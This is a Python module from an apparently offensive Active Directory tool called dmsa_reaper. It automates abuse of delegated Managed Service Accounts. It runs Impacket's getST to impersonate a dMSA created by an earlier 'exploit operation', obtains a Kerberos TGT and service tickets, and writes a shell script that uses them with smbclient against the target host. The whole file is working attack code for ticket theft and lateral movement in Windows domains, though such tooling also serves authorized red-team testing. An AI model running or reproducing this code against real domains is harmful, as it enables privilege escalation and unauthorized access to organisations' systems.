from __future__ import annotations

import hashlib
import json
import os
import re
import shutil
import shlex
import subprocess
import sys
import tempfile
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from impacket.krb5.ccache import CCache

from dmsa_reaper.models import Operation


class TicketAcquisitionError(RuntimeError):
    pass


def _utc_now_iso() -> str:
    return (
        datetime.now(timezone.utc)
        .replace(microsecond=0)
        .isoformat()
        .replace("+00:00", "Z")
    )


def _pretty(principal: Any) -> str:
    value = principal.prettyPrint()
    return value.decode("utf-8", errors="replace") if isinstance(value, bytes) else str(value)


def _principal_name(value: str) -> str:
    return value.split("@", 1)[0].lower()


def _inspect_ccache(
    path: Path,
    *,
    expected_client: str,
    expected_service: str,
    created_after: float,
) -> dict[str, Any]:
    """Parse a fresh cache and confirm it contains the requested credential."""
    if not path.is_file() or path.stat().st_size == 0:
        raise TicketAcquisitionError("Impacket did not produce a non-empty ccache")
    if path.stat().st_mtime + 1 < created_after:
        raise TicketAcquisitionError("ccache predates this ticket request")
    try:
        cache = CCache.loadFile(str(path))
    except Exception as exc:
        raise TicketAcquisitionError(f"produced artifact is not a valid ccache: {exc}") from exc
    if not cache.credentials:
        raise TicketAcquisitionError("produced ccache contains no credentials")

    now = int(time.time())
    clients: list[str] = []
    services: list[str] = []
    expiries: list[int] = []
    for credential in cache.credentials:
        client = _pretty(credential["client"])
        service = _pretty(credential["server"])
        clients.append(client)
        services.append(service)
        endtime = int(credential["time"]["endtime"])
        expiries.append(endtime)
    if any(_principal_name(client) != expected_client.lower() for client in clients):
        raise TicketAcquisitionError(
            f"ccache client does not match created dMSA {expected_client!r}"
        )
    expected = _principal_name(expected_service)
    if not any(_principal_name(service) == expected for service in services):
        raise TicketAcquisitionError(
            f"ccache does not contain the requested service {expected_service!r}"
        )
    if max(expiries) <= now:
        raise TicketAcquisitionError("ccache credentials are expired")
    return {
        "client": clients[0],
        "services": services,
        "expires_at": datetime.fromtimestamp(max(expiries), timezone.utc)
        .replace(microsecond=0)
        .isoformat()
        .replace("+00:00", "Z"),
        "size": path.stat().st_size,
    }


def _operation_dmsa_sam(operation: Operation) -> str:
    return str(
        operation.metadata.get("created_dmsa_sam")
        or operation.metadata.get("dmsa_sam")
        or ""
    )


def _usable_executable(path: Path) -> str | None:
    """Return an absolute executable path, or None for an unusable candidate."""
    try:
        candidate = path.expanduser().absolute()
        if not candidate.is_file():
            return None
        if os.name != "nt" and not os.access(candidate, os.X_OK):
            return None
    except OSError:
        return None
    return str(candidate)


def _explicit_executable(value: str | None) -> str | None:
    if not value:
        return None
    is_path = (
        os.path.isabs(value)
        or os.sep in value
        or (os.altsep is not None and os.altsep in value)
    )
    if is_path:
        return _usable_executable(Path(value))
    return shutil.which(value)


def _getst_executable(explicit: str | None) -> str | None:
    # A console-script installation can run dmsa-reaper from a virtualenv while
    # the shell PATH still resolves an unrelated system Impacket. Keep the two
    # tools in the same Python environment whenever that environment provides
    # getST.
    active_bin = Path(os.path.abspath(sys.executable)).parent
    for name in ("getST.py", "impacket-getST"):
        sibling = _usable_executable(active_bin / name)
        if sibling:
            return sibling

    override = _explicit_executable(explicit)
    if override:
        return override

    return shutil.which("getST.py") or shutil.which("impacket-getST")


def _write_operation_snapshot(run_dir: Path, operation: Operation) -> None:
    operation_path = run_dir / "operation.json"
    operation_path.write_text(
        operation.model_dump_json(indent=2) + "\n",
        encoding="utf-8",
    )
    os.chmod(operation_path, 0o600)


def _service_artifact_key(service: str) -> str:
    canonical = service.strip().casefold()
    readable = re.sub(r"[^a-z0-9._-]+", "-", canonical).strip("._-")
    readable = readable[:64].rstrip("._-") or "spn"
    digest = hashlib.sha256(canonical.encode("utf-8")).hexdigest()[:12]
    return f"{readable}-{digest}"


def _service_handoff(service: str) -> tuple[str, str]:
    service_type, spn_separator, instance = service.strip().partition("/")
    instance = instance.rsplit("@", 1)[0]
    hostname = instance.split("/", 1)[0]
    if hostname.startswith("["):
        closing_bracket = hostname.find("]")
        if closing_bracket != -1:
            hostname = hostname[1:closing_bracket]
    else:
        host_without_port, port_separator, port = hostname.rpartition(":")
        if port_separator and port.isdigit():
            hostname = host_without_port
    if not spn_separator or not service_type or not hostname:
        raise TicketAcquisitionError(
            "service SPN must use the service/hostname form"
        )
    return service_type.casefold(), hostname


def _failure_class(stdout: str, stderr: str, returncode: int) -> str:
    combined = f"{stdout}\n{stderr}"
    match = re.search(r"\b(?:KDC|KRB)_ERR_[A-Z0-9_]+", combined)
    if match:
        return match.group(0)
    lowered = combined.lower()
    if "clock skew" in lowered:
        return "clock-skew"
    if "name or service not known" in lowered or "dns" in lowered:
        return "dns"
    if returncode:
        return f"impacket-exit-{returncode}"
    return "no-valid-ccache"


def _write_getst_failure(
    run_dir: Path,
    *,
    stage: str,
    request: subprocess.CompletedProcess[str],
) -> Path | None:
    """Keep Impacket's exact failure output in the protected run directory."""
    path = run_dir / f"getst-{stage}-failure.log"
    body = (
        f"returncode: {request.returncode}\n"
        "\n[stdout]\n"
        f"{request.stdout or ''}"
        "\n[stderr]\n"
        f"{request.stderr or ''}"
    )
    try:
        path.write_text(body, encoding="utf-8")
        os.chmod(path, 0o600)
    except OSError:
        return None
    return path


def _diagnostic_summary(stdout: str, stderr: str) -> str:
    """Return a bounded, key-redacted failure summary for console metadata."""
    combined = f"{stdout}\n{stderr}"
    lines = [line.strip() for line in combined.splitlines() if line.strip()]
    noteworthy = [
        line
        for line in lines
        if line.startswith(("[-]", "[!]", "Kerberos SessionError:", "Traceback"))
        or "Error" in line
        or "error" in line
        or "cannot unpack" in line
    ]
    selected = noteworthy[-4:] if noteworthy else lines[-4:]
    summary = " | ".join(selected)
    # getST normally does not run in debug mode here, but redact any long
    # hexadecimal key material defensively before recording the CLI reason.
    summary = re.sub(r"(?i)\b[0-9a-f]{32,}\b", "<redacted-hex>", summary)
    return summary[:800]


def _run_getst(
    executable: str,
    args: list[str],
    *,
    cwd: Path,
    ccache: Path,
) -> subprocess.CompletedProcess[str]:
    env = os.environ.copy()
    env["KRB5CCNAME"] = str(ccache.resolve())
    return subprocess.run(
        [executable, *args],
        cwd=cwd,
        env=env,
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
    )


def _single_created_cache(stage: Path) -> Path:
    caches = list(stage.glob("*.ccache"))
    if len(caches) != 1:
        raise TicketAcquisitionError(
            f"expected exactly one new ccache from Impacket, found {len(caches)}"
        )
    return caches[0]


def acquire_dmsa_tgt(
    operation: Operation,
    *,
    source_ccache: Path,
    identity: str,
    domain: str,
    dc_ip: str | None = None,
    runs_dir: Path = Path(".reaper/runs"),
    getst_executable: str | None = None,
) -> dict[str, Any]:
    """Acquire and save a TGT for the dMSA used by an exploit operation."""
    if operation.status != "executed" or operation.cleaned_up:
        raise TicketAcquisitionError("TGT acquisition requires an active executed operation")
    dmsa_sam = _operation_dmsa_sam(operation)
    if not dmsa_sam:
        raise TicketAcquisitionError("operation has no dMSA sAMAccountName")
    if not source_ccache.is_file():
        raise TicketAcquisitionError(f"source ccache does not exist: {source_ccache}")
    executable = _getst_executable(getst_executable)
    if not executable:
        raise TicketAcquisitionError(
            "Impacket getST.py/impacket-getST is not installed on PATH"
        )

    run_dir = (runs_dir / operation.id).resolve()
    run_dir.mkdir(parents=True, exist_ok=True, mode=0o700)
    os.chmod(run_dir, 0o700)
    stage = Path(tempfile.mkdtemp(prefix=".tgt-stage-", dir=run_dir))
    started = time.time()
    dc_args = ["-dc-ip", dc_ip] if dc_ip else []
    try:
        request = _run_getst(
            executable,
            [
                "-k",
                "-no-pass",
                "-impersonate",
                dmsa_sam,
                "-self",
                "-dmsa",
                *dc_args,
                f"{domain}/{identity}",
            ],
            cwd=stage,
            ccache=source_ccache,
        )
        try:
            produced_tgt = _single_created_cache(stage)
            tgt_meta = _inspect_ccache(
                produced_tgt,
                expected_client=dmsa_sam,
                expected_service=f"krbtgt/{domain}",
                created_after=started,
            )
        except TicketAcquisitionError as exc:
            failure = _failure_class(request.stdout, request.stderr, request.returncode)
            diagnostic = _write_getst_failure(
                run_dir,
                stage="tgt",
                request=request,
            )
            detail = _diagnostic_summary(request.stdout, request.stderr)
            message = f"dMSA TGT acquisition failed ({failure})"
            if detail:
                message += f": {detail}"
            message += f"; artifact check: {exc}"
            if diagnostic:
                message += f"; diagnostic: {diagnostic}"
            raise TicketAcquisitionError(message) from exc

        tgt_path = run_dir / "created-dmsa.ccache"
        os.replace(produced_tgt, tgt_path)
        os.chmod(tgt_path, 0o600)
        result = {
            "status": "acquired",
            "acquired_at": _utc_now_iso(),
            "client": tgt_meta["client"],
            "target": operation.metadata.get("target_dn")
            or (operation.metadata.get("path") or {}).get("target_dn"),
            "tgt_ccache": str(tgt_path),
            "tgt": tgt_meta,
        }
        summary_path = run_dir / "tgt.json"
        summary_path.write_text(json.dumps(result, indent=2) + "\n", encoding="utf-8")
        os.chmod(summary_path, 0o600)
        operation.metadata["tgt"] = result
        _write_operation_snapshot(run_dir, operation)
        return result
    finally:
        shutil.rmtree(stage, ignore_errors=True)


def acquire_dmsa_ticket(
    operation: Operation,
    *,
    source_ccache: Path,
    identity: str,
    domain: str,
    service: str,
    dc_ip: str | None = None,
    runs_dir: Path = Path(".reaper/runs"),
    getst_executable: str | None = None,
) -> dict[str, Any]:
    """Acquire a dMSA TGT, request a service ticket, and write handoff artifacts."""
    service_type, service_host = _service_handoff(service)
    artifact_key = _service_artifact_key(service)
    dmsa_sam = _operation_dmsa_sam(operation)
    executable = _getst_executable(getst_executable)
    if not executable:
        raise TicketAcquisitionError(
            "Impacket getST.py/impacket-getST is not installed on PATH"
        )
    tgt_result = acquire_dmsa_tgt(
        operation,
        source_ccache=source_ccache,
        identity=identity,
        domain=domain,
        dc_ip=dc_ip,
        runs_dir=runs_dir,
        getst_executable=executable,
    )
    tgt_path = Path(tgt_result["tgt_ccache"])
    run_dir = tgt_path.parent
    service_stage = Path(tempfile.mkdtemp(prefix=".service-stage-", dir=run_dir))
    service_started = time.time()
    dc_args = ["-dc-ip", dc_ip] if dc_ip else []
    try:
        second = _run_getst(
            str(executable),
            ["-k", "-no-pass", "-spn", service, *dc_args, f"{domain}/{dmsa_sam}"],
            cwd=service_stage,
            ccache=tgt_path,
        )
        try:
            produced_service = _single_created_cache(service_stage)
            service_meta = _inspect_ccache(
                produced_service,
                expected_client=dmsa_sam,
                expected_service=service,
                created_after=service_started,
            )
        except TicketAcquisitionError as exc:
            failure = _failure_class(second.stdout, second.stderr, second.returncode)
            diagnostic = _write_getst_failure(
                run_dir,
                stage=f"service-{artifact_key}",
                request=second,
            )
            detail = _diagnostic_summary(second.stdout, second.stderr)
            message = f"service-ticket request failed ({failure})"
            if detail:
                message += f": {detail}"
            message += f"; artifact check: {exc}"
            if diagnostic:
                message += f"; diagnostic: {diagnostic}"
            raise TicketAcquisitionError(message) from exc
        service_path = run_dir / f"service-{artifact_key}.ccache"
        os.replace(produced_service, service_path)
        os.chmod(service_path, 0o600)

        use_path = run_dir / f"use-ticket-{artifact_key}.sh"
        handoff = (
            "#!/bin/sh\n"
            f"export KRB5CCNAME={shlex.quote(str(service_path))}\n"
        )
        if service_type == "cifs":
            handoff += (
                "smbclient.py -k -no-pass "
                f"{shlex.quote(f'{domain}/{dmsa_sam}@{service_host}')}\n"
            )
        use_path.write_text(handoff, encoding="utf-8")
        os.chmod(use_path, 0o700)

        result = {
            "status": "acquired",
            "acquired_at": _utc_now_iso(),
            "client": tgt_result["client"],
            "target": tgt_result["target"],
            "service": service,
            "service_host": service_host,
            "tgt_ccache": str(tgt_path),
            "service_ccache": str(service_path),
            "use_script": str(use_path),
            "tgt": tgt_result["tgt"],
            "service_ticket": service_meta,
        }
        summary_path = run_dir / f"ticket-{artifact_key}.json"
        summary_path.write_text(json.dumps(result, indent=2) + "\n", encoding="utf-8")
        os.chmod(summary_path, 0o600)
        operation.metadata["ticket"] = result
        _write_operation_snapshot(run_dir, operation)
        return result
    finally:
        shutil.rmtree(service_stage, ignore_errors=True)
